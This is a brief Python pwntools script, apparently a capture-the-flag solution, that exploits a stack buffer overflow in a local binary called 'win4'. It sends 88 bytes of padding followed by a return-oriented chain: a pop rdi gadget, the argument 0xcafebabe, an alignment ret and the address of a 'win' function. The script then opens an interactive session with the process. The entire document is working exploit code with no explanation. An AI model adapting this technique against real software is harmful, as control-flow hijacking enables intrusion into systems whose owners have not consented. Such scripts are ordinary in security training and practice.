from pwn import *

win = 0x0000000000401146
pop_rdi = 0x00000000004011fb # pop rdi; ret;
ret = 0x4011fc

payload = b"A"*88 + p64(pop_rdi) + p64(0xcafebabe) + p64(ret) + p64(win)

p = process('./win4')

pause()
p.sendline(payload)

p.interactive()
